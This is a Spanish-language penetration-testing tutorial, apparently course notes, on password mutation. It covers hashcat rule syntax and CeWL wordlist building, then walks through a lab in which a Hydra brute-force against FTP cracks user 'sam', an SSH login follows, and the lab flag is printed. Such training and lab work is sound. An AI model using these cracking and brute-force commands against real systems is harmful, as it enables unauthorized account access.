
# Password Mutations

## <mark style="color:purple;">Mutaciones de contraseña</mark>

***

Mucha gente crea sus contraseñas según `simplicidad en vez de seguridad`. Para eliminar esta debilidad humana que a menudo compromete las medidas de seguridad, se pueden crear políticas de contraseñas en todos los sistemas que determinan cómo debe verse una contraseña. Esto significa que el sistema reconoce si la contraseña contiene letras mayúsculas, caracteres especiales y números. Además, la mayoría de las políticas de contraseñas requieren una longitud mínima de ocho caracteres en una contraseña, incluida al menos una de las especificaciones anteriores.

En las secciones anteriores, adivinamos contraseñas muy simples, pero se vuelve mucho más difícil adaptar esto a sistemas que aplican políticas de contraseñas que obligan a crear contraseñas más complejas.

Desafortunadamente, la tendencia de los usuarios a crear contraseñas débiles también ocurre a pesar de la existencia de políticas de contraseñas. La mayoría de las personas/empleados siguen las mismas reglas al crear contraseñas más complejas. Las contraseñas suelen crearse en estrecha relación con el servicio utilizado. Esto significa que muchos empleados suelen seleccionar contraseñas que pueden tener el nombre de la empresa en las contraseñas. Las preferencias e intereses de una persona también juegan un papel importante. Pueden ser mascotas, amigos, deportes, pasatiempos y muchos otros elementos de la vida. La recopilación de información `OSINT` puede ser muy útil para obtener más información sobre las preferencias de un usuario y puede ayudar a adivinar la contraseña.&#x20;

Normalmente, los usuarios utilizan las siguientes adiciones a su contraseña para que se ajuste a las políticas de contraseña más comunes:

<table data-header-hidden><thead><tr><th width="340"></th><th></th></tr></thead><tbody><tr><td><strong>Descripción</strong></td><td><strong>Sintaxis de contraseña</strong></td></tr><tr><td>La primera letra es mayúscula</td><td><code>Password</code></td></tr><tr><td>Añadir números</td><td><code>Password123</code></td></tr><tr><td>Añadir año</td><td><code>Password2022</code></td></tr><tr><td>Añadir mes</td><td><code>Password02</code></td></tr><tr><td>El último carácter es un signo de exclamación</td><td><code>Password2022!</code></td></tr><tr><td>Añadiendo caracteres especiales</td><td><code>P@$$w0rd2022!</code></td></tr></tbody></table>

Teniendo en cuenta que muchas personas quieren mantener sus contraseñas lo más simples posible a pesar de las políticas de contraseñas, podemos crear reglas para generar contraseñas débiles. Según las estadísticas proporcionadas por [WPengine](https://wpengine.com/resources/passwords-unmasked-infographic/) , la mayoría de las longitudes de las contraseñas `no son superiores` a `10` caracteres.&#x20;

Entonces, lo que podemos hacer es elegir términos específicos que tengan al menos `5` caracteres y que parezcan más familiares para los usuarios, como los nombres de sus mascotas, pasatiempos, preferencias y otros intereses. Si el usuario elige una sola palabra (como el mes actual), agrega el `año actual`, seguido de un carácter especial, al final de su contraseña, alcanzaríamos el requisito de `10 caracteres` de contraseña.&#x20;

Teniendo en cuenta que la mayoría de las empresas requieren cambios regulares de contraseña, un usuario puede modificar su contraseña simplemente cambiando el nombre de un mes o un solo número, etc. Usemos un ejemplo simple para crear una lista de contraseñas con una sola entrada.

### **Lista de contraseñas**

```shell-session
afsh4ck@kali$ cat password.list

password
```

Podemos utilizar una herramienta muy poderosa llamada [Hashcat](https://hashcat.net/hashcat/) para combinar listas de nombres y etiquetas potenciales con reglas de mutación específicas para crear listas de palabras personalizadas.  Hashcat utiliza una sintaxis específica para definir caracteres y palabras y cómo se pueden modificar. La lista completa de esta sintaxis se puede encontrar en la [documentación](https://hashcat.net/wiki/doku.php?id=rule_based_attack) oficial de Hashcat. Sin embargo, los que se enumeran a continuación son suficientes para que entendamos cómo Hashcat muta las palabras.

<table data-header-hidden><thead><tr><th width="142"></th><th></th></tr></thead><tbody><tr><td><strong>Función</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>:</code></td><td>No hace ninguna modificación</td></tr><tr><td><code>l</code></td><td>Todas las letras minúsculas</td></tr><tr><td><code>u</code></td><td>Todas las letras mayúsculas</td></tr><tr><td><code>c</code></td><td>Pone en mayúscula la primera letra y las demás en minúscula</td></tr><tr><td><code>sXY</code></td><td>Reemplaza todas las instancias de X con Y</td></tr><tr><td><code>$!</code></td><td>Añade el carácter de exclamación al final</td></tr></tbody></table>

Cada regla está escrita en una nueva línea que determina cómo se debe mutar la palabra. Si escribimos las funciones mostradas arriba en un archivo y consideramos los aspectos mencionados, este archivo puede verse así:

### **Archivo de reglas Hashcat**

```shell-session
afsh4ck@kali$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c ss$
c sa@ so0
c sa@ so0 ss$
$!
$! c
$! so0
$! sa@
$! ss$
$! c so0
$! c sa@
$! c ss$
$! so0 sa@
$! c so0 sa@
$! c so0 sa@ ss$
```

Hashcat aplicará las reglas `custom.rule` para cada palabra de `password.list` y almacenará la versión mutada en nuestro `mut_password.list` en consecuencia. Por tanto, una palabra dará como resultado quince palabras mutadas en este caso.

### **Generar wordlist basado en reglas**

```shell-session
afsh4ck@kali$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
afsh4ck@kali$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

`Hashcat`y `John` vienen con listas de reglas prediseñadas que podemos usar para generar y descifrar contraseñas. Una de las reglas más utilizadas es `best64.rule`, que muchas veces puede conducir a buenos resultados. Es importante tener en cuenta que descifrar contraseñas y crear listas de palabras personalizadas es un juego de adivinanzas en la mayoría de los casos. Podemos reducir esto y realizar conjeturas más específicas si tenemos información sobre la política de contraseñas y tomamos en cuenta el nombre de la empresa, la región geográfica, la industria y otros temas/palabras que los usuarios pueden seleccionar para crear sus contraseñas. Las excepciones son, por supuesto, los casos en los que se filtran y encuentran contraseñas.

### **Reglas existentes de Hashcat**

```shell-session
afsh4ck@kali$ ls /usr/share/hashcat/rules/

best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```

## <mark style="color:purple;">CeWL</mark>

Ahora podemos utilizar otra herramienta llamada [CeWL](https://github.com/digininja/CeWL) para escanear palabras potenciales del sitio web de la empresa y guardarlas en una lista separada. Luego podemos combinar esta lista con las reglas deseadas y crear una lista de contraseñas personalizada que tenga una mayor probabilidad de adivinar la contraseña correcta.&#x20;

Especificamos algunos parámetros, como la profundidad del spidering ( `-d`), la longitud mínima de la palabra ( `-m`), el almacenamiento de las palabras encontradas en minúsculas ( `--lowercase`), así como el archivo donde queremos almacenar los resultados ( `-w`).

### **Generando listas de palabras usando CeWL**

```bash
cewl https://h4ckercademy.com -d 3 -w h4ckercademy.txt
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

cat h4ckercademy.txt                          
Sígueme
h4ckercademy
Cursos
Hacking
Ciberseguridad
```

***

## <mark style="color:purple;">Caso de uso</mark>

Cree una lista de palabras mutadas utilizando los archivos proporcionados. Utilice esta lista de palabras para forzar la contraseña del usuario "sam". Una vez conseguido, inicie sesión con SSH y envíe el contenido del archivo flag.txt como respuesta.

### Escaneo del host

```bash
sudo nmap -v -sS -T5 10.129.246.81 

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Nos encontramos una máquina con 4 servicios corriendo. Tiene FTP y SSH por lo que vamos a intentar explotar estos servicios con un ataque de contraseñas.

### Archivos

Disponemos de estos 3 archivos:

<figure><img src="/files/JexNe9s0fPaH9VCgAsft" alt=""><figcaption></figcaption></figure>

```shell-session
afsh4ck@kali$ cat custom.rule    
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
<-------SNIP------->
$2 $0 $2 $2 c sa@ so0
$2 $0 $2 $2 $!
$2 $0 $2 $2 $! c
$2 $0 $2 $2 $! so0
$2 $0 $2 $2 $! sa@
$2 $0 $2 $2 $! c so0
$2 $0 $2 $2 $! c sa@
$2 $0 $2 $2 $! so0 sa@
$2 $0 $2 $2 $! c so0 sa@
```

```shell-session
afsh4ck@kali$ cat password.list 
123456
12345
123456789
batman
password
iloveyou
princess
november
1234567
12345678
rockstar
abc123
nicole
daniel
12345678910
<-------SNIP------->
```

```shell-session
afsh4ck@kali$ cat username.list 
john
dennis
chris
cassie
admin
root
sysadmin
sysadm
svc
administrator
helpdesk
reception
finance
its
ict
hr
sam
servicedesk
sam
<-------SNIP------->
```

### Mutación de password.list

Vamos a utilizar las técnicas recogidas en esta sección para mutar las contraseñas contenidas en `password.list`, y para ello vamos a utilizar las reglas definidas en el archivo `custom.rule` de la siguiente manera:

```bash
wc -l password.list    
203 password.list  # <--- 203 elementos en la lista original
```

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

wc -l mut_password.list 
94044 mut_password.list # <--- 94044 elementos en la lista mutada
```

Esto nos ha generado una lista muy extensa, lo que al hacer bruteforce a SSH con Hydra tardaría mucho. Vamos a probar con `best64.rules` de hashcat:

```bash
hashcat --force password.list -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > mut64_password.list

wc -l mut64_password.list 
13937 mut64_password.list # <--- 13937 elementos en la lista con best64.rules
```

La lista es considerablemente menor, y este `best64.rules` suele ser muy efectivo. Así que vamos a probar a hacer bruteforce con hydra a FTP con el usuario `sam` de la siguiente manera:

```bash
hydra -l sam -P mut64_password.list ftp://10.129.246.81 -t 48
```

```bash
hydra -l sam -P mut64_password.list ftp://10.129.246.81 -t 48

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-25 15:50:27
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 48 tasks per 1 server, overall 48 tasks, 49103 login tries (l:1/p:49103), ~1023 tries per task
[DATA] attacking ftp://10.129.246.81:21/
[STATUS] 720.00 tries/min, 720 tries in 00:01h, 48383 to do in 01:08h, 48 active
[21][ftp] host: 10.129.246.81   login: sam   password: B@tm@n2022!
1 of 1 target successfully completed, 1 valid password found
```

Encontramos las credenciales de FTP del usuario Sam, por lo que posiblemente nos sirva para conectarnos a otros servicios como SSH:

```
User: sam
Pass: B@tm@n2022!
```

### Conexión por SSH

```bash
ssh sam@10.129.246.81
B@tm@n2022!

sam@nix01:~$ ls
Desktop    Downloads  Pictures  smb        Videos
Documents  Music      Public    Templates

sam@nix01:~$ cd /
sam@nix01:/$ ls
bin    dev   lib    libx32      mnt   root  srv  usr
boot   etc   lib32  lost+found  opt   run   sys  var
cdrom  home  lib64  media       proc  sbin  tmp

sam@nix01:/$ cd home/
sam@nix01:/home$ ls
kira  sam  will

sam@nix01:/home$ 
```

Encontramos 3 usuarios en este sistema: `kira`, `sam` y `will`. Al acceder a la carpeta `sam/smb` obtenemos la flag:

```bash
sam@nix01:~$ cd smb
sam@nix01:~/smb$ ls
flag.txt
sam@nix01:~/smb$ cat flag.txt 
HTB{P455_Mu7ations}
```
